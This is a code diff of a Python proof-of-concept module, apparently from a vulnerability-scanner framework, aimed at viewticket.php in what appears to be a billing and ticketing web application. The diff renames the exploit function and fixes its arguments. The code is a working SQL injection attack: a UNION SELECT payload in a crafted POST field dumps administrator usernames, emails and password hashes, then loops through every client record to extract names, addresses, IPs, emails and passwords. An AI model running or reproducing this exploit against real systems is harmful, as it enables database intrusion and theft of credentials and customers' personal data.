@@ -34,11 +34,10 @@ class Vuln(ABVuln):
 ua = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36"
 
 
-def exploit(sql, url):
+def my_exploit(sql, url):
     sqlUnion = '-1 union select 1,0,0,0,0,0,0,0,0,0,0,%s,0,0,0,0,0,0,0,0,0,0,0#' % sql
     print("Doing stuff: %s" % sqlUnion)
     # you could exploit any file that does a select, I randomly chose viewticket.php
-    #print (url)
     r = urlopen(Request('%sviewticket.php' % url,
                         data="tid[sqltype]=TABLEJOIN&tid[value]=%s" % sqlUnion, headers={"User-agent": ua})).read()
     return re.search(r'<div class="clientmsg">(.*?)</div>', r, re.DOTALL).group(1).strip()
@@ -74,7 +73,7 @@ class Poc(ABPoc):
             # https://www.t00ls.net/articles-24597.html
             # get admins
             # print exploit('(SELECT GROUP_CONCAT(id,0x3a,username,0x3a,email,0x3a,password SEPARATOR 0x2c20) FROM tbladmins)')
-            if exploit('(SELECT GROUP_CONCAT(id,0x3a,username,0x3a,email,0x3a,password SEPARATOR 0x2c20) FROM tbladmins)', self.target):
+            if my_exploit('(SELECT GROUP_CONCAT(id,0x3a,username,0x3a,email,0x3a,password SEPARATOR 0x2c20) FROM tbladmins)', self.target):
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -89,14 +88,16 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
 
             # get admins
-            admins = exploit(
-                '(SELECT GROUP_CONCAT(id,0x3a,username,0x3a,email,0x3a,password SEPARATOR 0x2c20) FROM tbladmins)', self.target)
+            admins = my_exploit(
+                '(SELECT GROUP_CONCAT(id,0x3a,username,0x3a,email,0x3a,password SEPARATOR 0x2c20) FROM tbladmins)',
+                self.target)
 
             # get users
-            count = int(exploit('(SELECT COUNT(id) FROM tblclients)'))
-            print("User count %d" % count)
+            count = int(my_exploit(
+                '(SELECT COUNT(id) FROM tblclients)', self.target))
+            self.output.info("User count %d" % count)
             for i in range(count):
-                users = exploit(
+                users = my_exploit(
                     '(SELECT CONCAT(id,0x3a,firstname,0x3a,lastname,0x3a,address1,0x3a,address2,0x3a,city,0x3a,country,0x3a,ip,0x3a,email,0x3a,password) FROM tblclients LIMIT %d,1)' % i, self.target)
 
             if admins and users:
